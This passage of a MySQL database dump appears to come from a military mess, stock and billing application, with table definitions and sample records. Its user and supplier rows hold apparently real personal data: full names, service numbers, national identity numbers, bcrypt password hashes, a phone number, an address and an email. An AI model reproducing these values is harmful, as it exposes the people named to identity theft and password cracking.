  INDEX `personal_access_tokens_tokenable_type_tokenable_id_index`(`tokenable_type` ASC, `tokenable_id` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of personal_access_tokens
-- ----------------------------

-- ----------------------------
-- Table structure for ranks
-- ----------------------------
DROP TABLE IF EXISTS `ranks`;
CREATE TABLE `ranks`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(40) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `priority` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of ranks
-- ----------------------------

-- ----------------------------
-- Table structure for role_has_permissions
-- ----------------------------
DROP TABLE IF EXISTS `role_has_permissions`;
CREATE TABLE `role_has_permissions`  (
  `permission_id` bigint UNSIGNED NOT NULL,
  `role_id` bigint UNSIGNED NOT NULL,
  PRIMARY KEY (`permission_id`, `role_id`) USING BTREE,
  INDEX `role_has_permissions_role_id_foreign`(`role_id` ASC) USING BTREE,
  CONSTRAINT `role_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `role_has_permissions_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of role_has_permissions
-- ----------------------------
INSERT INTO `role_has_permissions` VALUES (3, 1);
INSERT INTO `role_has_permissions` VALUES (4, 1);
INSERT INTO `role_has_permissions` VALUES (5, 1);
INSERT INTO `role_has_permissions` VALUES (6, 1);
INSERT INTO `role_has_permissions` VALUES (7, 1);
INSERT INTO `role_has_permissions` VALUES (8, 1);
INSERT INTO `role_has_permissions` VALUES (9, 1);
INSERT INTO `role_has_permissions` VALUES (10, 1);
INSERT INTO `role_has_permissions` VALUES (11, 1);
INSERT INTO `role_has_permissions` VALUES (12, 1);
INSERT INTO `role_has_permissions` VALUES (13, 2);
INSERT INTO `role_has_permissions` VALUES (14, 2);
INSERT INTO `role_has_permissions` VALUES (15, 2);
INSERT INTO `role_has_permissions` VALUES (16, 2);
INSERT INTO `role_has_permissions` VALUES (17, 2);
INSERT INTO `role_has_permissions` VALUES (18, 2);
INSERT INTO `role_has_permissions` VALUES (19, 2);
INSERT INTO `role_has_permissions` VALUES (20, 2);
INSERT INTO `role_has_permissions` VALUES (21, 2);
INSERT INTO `role_has_permissions` VALUES (22, 2);
INSERT INTO `role_has_permissions` VALUES (24, 3);
INSERT INTO `role_has_permissions` VALUES (26, 3);
INSERT INTO `role_has_permissions` VALUES (23, 4);
INSERT INTO `role_has_permissions` VALUES (25, 4);

-- ----------------------------
-- Table structure for roles
-- ----------------------------
DROP TABLE IF EXISTS `roles`;
CREATE TABLE `roles`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `module` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `mess_id` int NULL DEFAULT NULL,
  `guard_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `roles_name_guard_name_mess_id_unique`(`name` ASC, `guard_name` ASC, `mess_id` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of roles
-- ----------------------------
INSERT INTO `roles` VALUES (1, 'Ration Clerk', 'Demand-Management-Module', 1, 'admin', '2023-01-31 09:26:16', '2023-01-31 09:26:16');
INSERT INTO `roles` VALUES (2, 'Stock Keeper', 'Stock-Management-Module', 1, 'admin', '2023-01-31 09:26:38', '2023-01-31 09:27:45');
INSERT INTO `roles` VALUES (3, 'Billing Clerk', 'Bill-Management-Module', 1, 'admin', '2023-01-31 09:27:11', '2023-01-31 09:27:53');
INSERT INTO `roles` VALUES (4, 'Barman', 'Bar-Management-Module', 1, 'admin', '2023-01-31 09:27:25', '2023-01-31 09:27:33');

-- ----------------------------
-- Table structure for sections
-- ----------------------------
DROP TABLE IF EXISTS `sections`;
CREATE TABLE `sections`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `sections_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  INDEX `sections_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `sections_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `sections_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of sections
-- ----------------------------

-- ----------------------------
-- Table structure for sfhq
-- ----------------------------
DROP TABLE IF EXISTS `sfhq`;
CREATE TABLE `sfhq`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `priority` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of sfhq
-- ----------------------------
INSERT INTO `sfhq` VALUES (1, 'SFHQ-J', 1, NULL, NULL);
INSERT INTO `sfhq` VALUES (2, 'SFHQ-W', 2, NULL, NULL);
INSERT INTO `sfhq` VALUES (3, 'SFHQ-E', 3, NULL, NULL);
INSERT INTO `sfhq` VALUES (4, 'SFHQ-MLT', 4, NULL, NULL);
INSERT INTO `sfhq` VALUES (5, 'SFHQ-W', 5, NULL, NULL);
INSERT INTO `sfhq` VALUES (6, 'SFHQ-C', 6, NULL, NULL);

-- ----------------------------
-- Table structure for stock_adjustments
-- ----------------------------
DROP TABLE IF EXISTS `stock_adjustments`;
CREATE TABLE `stock_adjustments`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `stock_id` bigint UNSIGNED NULL DEFAULT NULL,
  `pre_stock` double NOT NULL DEFAULT 0,
  `adjusted_stock` double NOT NULL DEFAULT 0,
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `stock_adjustments_stock_id_index`(`stock_id` ASC) USING BTREE,
  INDEX `stock_adjustments_creater_id_index`(`creater_id` ASC) USING BTREE,
  CONSTRAINT `stock_adjustments_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `stock_adjustments_stock_id_foreign` FOREIGN KEY (`stock_id`) REFERENCES `stocks` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of stock_adjustments
-- ----------------------------

-- ----------------------------
-- Table structure for stock_books
-- ----------------------------
DROP TABLE IF EXISTS `stock_books`;
CREATE TABLE `stock_books`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `item_id` bigint UNSIGNED NULL DEFAULT NULL,
  `date` date NOT NULL,
  `receive_qty` double NOT NULL DEFAULT 0,
  `issue_qty` double NOT NULL DEFAULT 0,
  `quarter` tinyint NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `balance_qty` double NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `stock_books_item_id_index`(`item_id` ASC) USING BTREE,
  CONSTRAINT `stock_books_item_id_foreign` FOREIGN KEY (`item_id`) REFERENCES `items` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of stock_books
-- ----------------------------
INSERT INTO `stock_books` VALUES (1, 3, '2023-02-01', 60, 0, 1, '2023-02-01 09:20:14', '2023-02-01 09:20:14', 60);
INSERT INTO `stock_books` VALUES (2, 2, '2023-02-01', 50, 0, 1, '2023-02-01 09:20:45', '2023-02-01 09:20:45', 50);
INSERT INTO `stock_books` VALUES (3, 1, '2023-02-01', 8, 0, 1, '2023-02-01 09:21:23', '2023-02-01 09:21:23', 8);

-- ----------------------------
-- Table structure for stocks
-- ----------------------------
DROP TABLE IF EXISTS `stocks`;
CREATE TABLE `stocks`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `item_id` bigint UNSIGNED NULL DEFAULT NULL,
  `qty` double NOT NULL DEFAULT 0,
  `last_txn_type` varchar(5) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `below_qty` double NOT NULL DEFAULT 0,
  `shot` double NULL DEFAULT 0,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `stocks_item_id_index`(`item_id` ASC) USING BTREE,
  CONSTRAINT `stocks_item_id_foreign` FOREIGN KEY (`item_id`) REFERENCES `items` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of stocks
-- ----------------------------
INSERT INTO `stocks` VALUES (1, 1, 7, 'in', '2023-02-01 09:15:55', '2023-02-01 11:04:53', 0, 14);
INSERT INTO `stocks` VALUES (2, 2, 47, 'in', '2023-02-01 09:16:27', '2023-02-01 11:02:54', 0, 0);
INSERT INTO `stocks` VALUES (3, 3, 57, 'in', '2023-02-01 09:17:54', '2023-02-01 09:28:09', 0, 0);

-- ----------------------------
-- Table structure for suppliers
-- ----------------------------
DROP TABLE IF EXISTS `suppliers`;
CREATE TABLE `suppliers`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(150) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `tele` varchar(12) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mobile` varchar(12) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NULL DEFAULT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `suppliers_creater_id_index`(`creater_id` ASC) USING BTREE,
  INDEX `suppliers_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  CONSTRAINT `suppliers_creater_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `suppliers_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of suppliers
-- ----------------------------
INSERT INTO `suppliers` VALUES (1, 'Anuruddha Ekanayake', 'NO 210/A\r\nWerapitiya Road', '0785660569', '0785660569', 'apb.ekanayake@gmail.com', 1, '172.16.207.100', 2, 1, '2023-02-01 09:18:35', '2023-02-01 09:18:35');

-- ----------------------------
-- Table structure for user_types
-- ----------------------------
DROP TABLE IF EXISTS `user_types`;
CREATE TABLE `user_types`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `user_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user_types
-- ----------------------------
INSERT INTO `user_types` VALUES (1, 'super-admin', '2022-11-30 22:36:30', NULL);
INSERT INTO `user_types` VALUES (2, 'mess-manager', '2022-11-30 22:36:30', NULL);
INSERT INTO `user_types` VALUES (3, 'ration-clerk', '2022-11-30 22:36:30', NULL);
INSERT INTO `user_types` VALUES (4, 'barman', '2022-11-30 22:36:30', NULL);

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `service_no` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `rank` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `full_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `name_according_to_part2` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `regiment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `unit` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `nic` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `users_email_unique`(`email` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES (1, 'TMSU THENNAKOON  ', '100380912', 'O/34562', 'Lt', 'Tennakoon Mudiyanselade Saditha Udayanga Tennakoon', 'TMSU THENNAKOON  ', 'SLSC', 'RHQ SLSC', '931342894V', NULL, '$2y$10$mQ23ex7wg/g/e9xSApunJu4xft6ALl8upeIA1LY7cQjVnayPPPgEK', NULL, '2023-01-31 09:30:26', '2023-01-31 09:30:26');
INSERT INTO `users` VALUES (2, 'MMMS BANDARA  ', '100380913', 'O/34563', 'Lt', 'Mannaperuma Mudiyanselage Manoj Suranga Bandara', 'MMMS BANDARA  ', 'SLSC', 'RHQ SLSC', '900712880V', NULL, '$2y$10$XXplcPDicpwLH5BtKDpgg.EZ.gVeel1Fo9mEFqYgDupT6MAn0uT9C', NULL, '2023-01-31 09:30:41', '2023-01-31 09:30:41');
INSERT INTO `users` VALUES (3, 'MFM JAVID  ', '100380844', 'O/34565', 'Lt', 'Mohamed Faizer Mohamed Javid', 'MFM JAVID  ', 'SLSC', 'RHQ SLSC', '920361218v', NULL, '$2y$10$u/2yiOLWyc8qGn4CmS2D4ulhJsw92XvdUFEpBZujRYz3710yPTdBW', NULL, '2023-01-31 09:31:03', '2023-01-31 09:31:03');
INSERT INTO `users` VALUES (4, 'J H H Perera  ', '100008618', 'O/68972', 'Major', 'Harsha perera', 'J H H Perera  ', 'SLSC', '6 SLSC', '850084068V', NULL, '$2y$10$oFSSwRaip.ymi4kmR0tZFeoj9V4MC/rZHBa8Zf1zs2/bceYL/SjLm', NULL, '2023-01-31 09:51:43', '2023-01-31 09:51:43');

-- ----------------------------
-- Procedure structure for getUsers
-- ----------------------------
DROP PROCEDURE IF EXISTS `getUsers`;
delimiter ;;
CREATE PROCEDURE `getUsers`()
BEGIN 
	SELECT * FROM users;
END
;;
delimiter ;

SET FOREIGN_KEY_CHECKS = 1;
